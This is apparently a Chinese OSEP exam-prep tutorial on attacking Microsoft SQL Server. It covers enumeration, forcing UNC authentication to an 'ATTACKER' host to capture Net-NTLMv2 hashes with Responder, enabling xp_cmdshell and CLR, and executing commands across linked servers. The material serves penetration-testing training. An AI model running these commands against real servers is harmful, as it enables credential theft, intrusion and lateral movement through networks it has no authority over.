---
title: OSEP-15-MSSQL从凭证到代码执行学习闭环
description: '15-MSSQL攻击 | 07-MSSQL从凭证到代码执行学习闭环'
pubDate: 2026-01-30T00:02:30+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Exploit Development
  - Credential Dumping
  - SQL Injection
---

# MSSQL 从凭证到代码执行学习闭环

## 这篇文档解决什么问题

MSSQL 攻击很容易被学成几个孤立命令：`xp_cmdshell`、`xp_dirtree`、Linked Server。对 OSEP 来说，更重要的是把 MSSQL 当成一条横向移动和权限扩展链：

```text
发现 1433 或数据库凭证
  -> 判断认证方式和当前 SQL 权限
  -> 枚举数据库、登录名、服务器角色、服务账户
  -> 选择 UNC 捕获、中继、xp_cmdshell、CLR、Linked Server
  -> 转成操作系统权限或跨服务器路径
  -> 回到凭证、横向移动和 AD 攻击链
```

只在授权实验环境和考试备考中使用。

---

## MSSQL 在攻击链里的价值

| 价值 | 说明 |
|---|---|
| 数据 | 业务数据、账号、配置、连接串 |
| 身份 | SQL 登录、Windows 登录、服务账户 |
| 代码执行 | `xp_cmdshell`、Agent Job、CLR Assembly |
| 凭证捕获 | UNC 路径触发 Net-NTLM |
| 横向移动 | Linked Server 到其他 SQL Server |
| 域攻击桥梁 | 服务账户权限、Relay、AD 访问 |

初学者要记住：MSSQL 不是只有数据库，它经常跑在域服务账户下，并且能连接其他服务器。

---

## 10 分钟正序枚举流程

### 0-2 分钟：确认能否连接

常见连接方式：

```bash
mssqlclient.py DOMAIN/user:Password123!@TARGET -windows-auth
mssqlclient.py sqluser:Password123!@TARGET
```

PowerShell/SQL 客户端也可以，只要能执行查询即可。

要记录：

| 项目 | 为什么重要 |
|---|---|
| 目标主机/IP | 后续报告和横向 |
| 认证方式 | Windows Auth 还是 SQL Auth |
| 当前 SQL 用户 | 判断权限 |
| 是否加密/证书异常 | 影响连接和代理 |

### 2-4 分钟：确认身份和权限

```sql
SELECT @@version;
SELECT @@servername;
SELECT SYSTEM_USER;
SELECT SUSER_SNAME();
SELECT ORIGINAL_LOGIN();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('serveradmin');
SELECT IS_SRVROLEMEMBER('securityadmin');
```

判断：

| 输出 | 下一步 |
|---|---|
| `sysadmin = 1` | 可考虑 xp_cmdshell、CLR、服务器级枚举 |
| 不是 sysadmin | 枚举数据库权限、可冒充、链接服务器 |
| Windows 登录 | 关注域身份和服务账户 |
| SQL 登录 | 关注权限提升、凭证复用 |

### 4-6 分钟：枚举数据库和登录名

```sql
SELECT name FROM sys.databases;
SELECT name,type_desc,is_disabled FROM sys.server_principals;
SELECT * FROM sys.sql_logins;
```

如果权限允许：

```sql
SELECT name FROM sys.server_permissions;
```

关注：

- 是否有应用数据库。
- 是否有高权限登录。
- 是否能 `IMPERSONATE`。
- 是否存在明文连接串或配置表。

### 6-8 分钟：枚举服务器级攻击面

```sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
```

判断：

| 发现 | 可能路线 |
|---|---|
| `xp_cmdshell` 可用 | 直接 OS 命令执行 |
| 可启用 `xp_cmdshell` | sysadmin 路线 |
| Linked Server | 跨 SQL 横向 |
| 高权限服务账户 | OS/域路径 |
| 可触发 UNC 访问 | Net-NTLM 捕获或中继 |

### 8-10 分钟：选路线

| 当前条件 | 推荐路线 |
|---|---|
| sysadmin | `xp_cmdshell`、CLR、Agent Job |
| 非 sysadmin 但有链接服务器 | Linked Server 权限差异 |
| 可触发 UNC | `xp_dirtree`/`xp_fileexist` 捕获 Net-NTLM |
| 拿到服务账户 Hash | 中继或破解后横向 |
| 数据库里有连接串 | 转向 Windows 凭证/横向 |

---

## 路线一：UNC 路径注入与凭证捕获

### 概念说明

当 MSSQL 访问 UNC 路径时，Windows 可能用 SQL Server 服务账户向远程主机发起 NTLM 认证。你可以在授权实验环境中捕获 Net-NTLMv2，用于离线破解或中继判断。

### 使用场景

- 你能执行某些扩展存储过程。
- SQL Server 能访问你的监听主机。
- 服务账户身份有价值。

### 常用命令

攻击机监听：

```bash
responder -I tun0
```

SQL 侧触发：

```sql
EXEC xp_dirtree '\\ATTACKER\share';
EXEC xp_fileexist '\\ATTACKER\share\file.txt';
```

### 注意事项

| 点 | 说明 |
|---|---|
| 捕获的是 Net-NTLMv2 | 不是 NTLM Hash，不能直接 PtH |
| 价值取决于服务账户 | 本地虚拟账户价值可能较低 |
| 网络出站要通 | SQL Server 到攻击机 445/Responder |
| 中继要看目标协议 | SMB 签名、LDAP 签名、EPA 等会影响 |

### 排错

| 现象 | 排查 |
|---|---|
| Responder 无请求 | SQL 到攻击机网络不通、防火墙、UNC 被拦 |
| 捕获到但破解不了 | 密码强，考虑中继或换路线 |
| 账户是机器账户 | 看能否中继到 ADCS/LDAP 或用于机器账户路线 |
| 触发过程不可用 | 权限不足或扩展过程被禁 |

---

## 路线二：xp_cmdshell 代码执行

### 概念说明

`xp_cmdshell` 让 SQL Server 执行操作系统命令。执行身份通常是 SQL Server 服务账户，或者配置的代理账户。

### 使用场景

- 当前 SQL 身份是 sysadmin。
- `xp_cmdshell` 已启用，或你能启用。
- 目标上执行 OS 命令有价值。

### 常用命令

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
```

### 注意事项

| 点 | 说明 |
|---|---|
| 执行身份很关键 | `whoami` 是第一条命令 |
| 输出可能被截断 | 大输出写文件再读 |
| 防护可能拦 payload | 先用小命令验证 |
| 网络回连可能失败 | 回到网络过滤章节 |

### 排错

| 现象 | 排查 |
|---|---|
| `xp_cmdshell` 不存在/禁用 | 是否 sysadmin，是否可启用 |
| 启用失败 | 权限不足 |
| `whoami` 成功但 payload 不回连 | AV、网络、架构、代理 |
| 权限很低 | 服务账户权限低，转凭证/本地提权/Linked Server |

---

## 路线三：CLR 自定义程序集

### 概念说明

CLR Assembly 允许 SQL Server 加载 .NET 程序集。它可以成为 `xp_cmdshell` 被禁用时的替代执行路线，但前提和限制更多。

### 使用场景

- 有足够权限启用 CLR。
- `xp_cmdshell` 不可用或被监控。
- 需要通过 .NET 代码执行特定动作。

### 关键检查

```sql
SELECT * FROM sys.configurations WHERE name = 'clr enabled';
SELECT * FROM sys.databases;
```

常见设置方向：

```sql
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
```

### 注意事项

| 点 | 说明 |
|---|---|
| 需要权限 | 通常需要高权限 |
| 版本和安全设置影响大 | TRUSTWORTHY、签名、权限集 |
| 排错复杂 | 初学者先理解流程，再背代码 |
| 更适合有准备的 payload | 考试前要提前练熟 |

### 排错

| 现象 | 排查 |
|---|---|
| 创建程序集失败 | 权限、数据库设置、程序集格式 |
| 执行失败 | .NET 版本、依赖、权限集 |
| 命令无输出 | 输出处理、异常被吞 |

---

## 路线四：Linked Server 横向移动

### 概念说明

Linked Server 是 SQL Server 到其他数据库服务器的信任连接。你在服务器 A 上的身份，经过链接到服务器 B 时可能映射成另一个更高权限身份。

### 使用场景

- `sys.servers` 或 `sp_linkedservers` 发现链接服务器。
- 当前权限不高，但链接过去权限更高。
- 链接服务器位于另一个网段或域边界。

### 常用命令

```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

SELECT * FROM OPENQUERY("LINKED", 'SELECT @@version');
SELECT * FROM OPENQUERY("LINKED", 'SELECT SYSTEM_USER');
SELECT * FROM OPENQUERY("LINKED", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```

如果链接端有 sysadmin：

```sql
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT LINKED;
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT LINKED;
EXEC ('EXEC xp_cmdshell ''whoami'';') AT LINKED;
```

### 注意事项

| 点 | 说明 |
|---|---|
| 链接方向有方向性 | A 能到 B，不代表 B 能到 A |
| 权限映射是关键 | 看 `SYSTEM_USER` 和 sysadmin |
| 多跳链路要记录清楚 | 报告里写明 A->B->C |
| SQL Link 可能跨域 | 接到域森林/MSSQL 边界攻击 |

### 排错

| 现象 | 排查 |
|---|---|
| OPENQUERY 失败 | 链接不可用、认证失败、目标离线 |
| 权限低 | 映射身份低，找其他链接或权限提升 |
| 远程 xp_cmdshell 失败 | 远程端权限和配置 |
| 多层引号报错 | 简化命令，逐层验证 |

---

## MSSQL 到 AD/横向移动的连接

| MSSQL 发现 | 下一章路线 |
|---|---|
| 服务账户是域账号 | `13-Windows凭证`、`16-AD权限滥用` |
| 捕获 Net-NTLMv2 | 破解或中继，可能接 `21-ADCS证书攻击` |
| `xp_cmdshell` 得到 OS Shell | `13-Windows凭证`、`14-横向移动` |
| Linked Server 到高权限 SQL | 继续 MSSQL 横向 |
| 数据库连接串 | 凭证材料去向表 |
| SQL Agent/CLR 可执行 | 代码执行和凭证提取 |

---

## 初学者排错总表

| 现象 | 不要急着做什么 | 应该先查什么 |
|---|---|---|
| 1433 开着但连不上 | 不要换一堆工具 | 认证方式、域名、加密、账号状态 |
| SQL 登录成功但不能执行命令 | 不要直接上 payload | 当前是否 sysadmin、是否能启用功能 |
| UNC 没捕获到 Hash | 不要认为漏洞不存在 | SQL 到攻击机网络、出站 SMB、防火墙 |
| Hash 捕获后不能 PtH | 不要混淆材料 | Net-NTLMv2 不能直接 PtH |
| Linked Server 查询失败 | 不要立刻放弃 | 链接名、引号、权限、目标状态 |
| xp_cmdshell 有输出但回连失败 | 不要换 SQL 路线 | 网络过滤、AV、代理、payload 位数 |
| 服务账户权限低 | 不要停在 SQL | 查本机凭证、链接服务器、数据库配置 |

---

## OSEP 考试相关重点

1. MSSQL 是横向移动节点，不只是数据库题。
2. 先枚举当前 SQL 权限，再决定 UNC、xp_cmdshell、CLR、Linked Server。
3. Net-NTLMv2、NTLM Hash、明文密码要分清，不能混用。
4. Linked Server 的权限映射可能比当前服务器更重要。
5. 报告里要写出连接身份、SQL 权限、执行身份、链接路径和影响范围。

---

## 自检清单

- [ ] 我能连接 MSSQL 后先查 `SYSTEM_USER`、`ORIGINAL_LOGIN`、`sysadmin`。
- [ ] 我知道 `xp_dirtree` 捕获的是 Net-NTLMv2，不是可直接 PtH 的 NTLM Hash。
- [ ] 我能解释 `xp_cmdshell` 的执行身份为什么重要。
- [ ] 我知道 CLR 和 xp_cmdshell 的前提差异。
- [ ] 我能从 Linked Server 输出判断是否存在横向机会。
- [ ] 我能把 MSSQL 发现接到 Windows 凭证、横向移动、ADCS 或 AD 权限滥用。
